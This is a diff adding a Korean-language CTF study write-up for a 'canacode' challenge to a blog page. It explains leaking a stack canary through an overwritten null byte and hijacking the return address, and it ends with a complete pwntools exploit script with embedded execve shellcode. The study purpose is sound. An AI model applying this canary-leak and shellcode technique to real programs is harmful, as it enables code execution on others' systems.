@@ -332,6 +332,64 @@ gdb를 통해서 열어보자.</p>
 모든 정보를 종합하여 최종적으로 0x12346EF8E가 되며, Scanf를 %lld로 받기 때문에 정답의 10진수인<br>
 4886818702를 입력해야 한다.</p>
 <p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/assemlator/flag.PNG?raw=true" alt="flag"></p>
+<h1 id="canacode">canacode</h1>
+<p>마지막이다. 문제 확인부터..</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/problem.PNG?raw=true" alt="problem"></p>
+<p>흠.. 일단 다운받아서 실행해보자.</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/play.PNG?raw=true" alt="play"></p>
+<p>2번의 출력, 1번의 입력, 아까 풀었던 canary와 매우 유사하다! 그렇다면 main을 확인해보자.</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/pd%20main.PNG?raw=true" alt="pd main"></p>
+<p>전체적인 구조는 canary와 유사하다. 차이점은 canary가 수동이 아닌 보호기법으로서 걸려있다는 것.</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/cmp.PNG?raw=true" alt="cmp"></p>
+<p>그리고 rbp-0x30의 데이터와 0x4020b5를 비교한다는 것이다. 0x4020b5가 뭘까?</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/str.PNG?raw=true" alt="str"></p>
+<p>단순한 대답이다. 이제 canary만 알아내면 ret 변조가 가능하다! 이는 첫 read를 이용해서 출력할 것이다.</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/fscan.PNG?raw=true" alt="fscan"></p>
+<p>코드를 보면 rbp-0x40에서 입력을 받는데, canary는 rbp-0x8에 위치해있다.<br>
+즉, 둘 사이에 0x38만큼의 차이가 존재하며 그 다음에 canary가 존재한다는 것이다.<br>
+canary는 가장 첫 8bits가 0으로 채워져 있다. 이는 기존 문자열과의 혼동을 방지하기 위해서인데,<br>
+이를 임의의 문자로 채워주는 것으로 출력할 때, canary도 같이 출력하게 할 수 있다.<br>
+즉, A를 0x38만큼 입력하고 B를 입력해주면 canary의 첫 1byte가 B로 바뀌면서 같이 출력될 것이다.</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/canary.PNG?raw=true" alt="canary"></p>
+<p>성공! 이제 ret를 변조하면 된다. 필자가 목표로 해야하는 지점은 init_shell 함수,<br>
+시작 주소를 찾아보자!!</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/shell.PNG?raw=true" alt="shell"></p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/pd%20shell.PNG?raw=true" alt="pd shell"></p>
+<p>이렇게 시작주소를 알아냈으니 이를 little endian으로 ret에 위치에 넣어주면?<br>
+다음과 같이 init_shell 함수가 실행되는 것을 확인할 수 있다.<br>
+(init_shell이 실행되면</p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/inshell.PNG?raw=true" alt="inshell"></p>
+<p><img src="https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_2/canacode/inshell2.PNG?raw=true" alt="inshell2"></p>
+<p>필자의 페이로드도 같이 남겨두겠다!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python3" data-lang="Python3"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> tty
+context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
+
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./canacode&#39;</span>)
+gdb<span style="color:#f92672">.</span>attach(r)
+
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;name?&#39;</span>)
+r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x38</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;B&#34;</span>)
+tmp <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;AB&#39;</span>)
+tmp <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()
+tmp1 <span style="color:#f92672">=</span> tmp[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">7</span>]
+
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;[Yes/No]&#39;</span>)
+
+ans <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5965734141414141</span>
+pad <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>
+shell1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x31f648bb2f62696e</span>
+shell2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2f2f73685653545f</span>
+shell3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6a3b5831d20f0500</span>
+ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f3</span>
+
+pay <span style="color:#f92672">=</span> p64(ans, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> p64(shell1, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> p64(shell2, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> p64(shell3, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span>p64(pad) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> tmp1 <span style="color:#f92672">+</span> p64(pad) <span style="color:#f92672">+</span> p64(ret)
+
+r<span style="color:#f92672">.</span>send(pay)
+
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
               
             </div>
           </div>
@@ -356,7 +414,7 @@ gdb를 통해서 열어보자.</p>
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://roomrooms.github.io/2021/11/weak_3/" data-tooltip="Weak_3">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -442,7 +500,7 @@ gdb를 통해서 열어보자.</p>
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://roomrooms.github.io/2021/11/weak_3/" data-tooltip="Weak_3">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
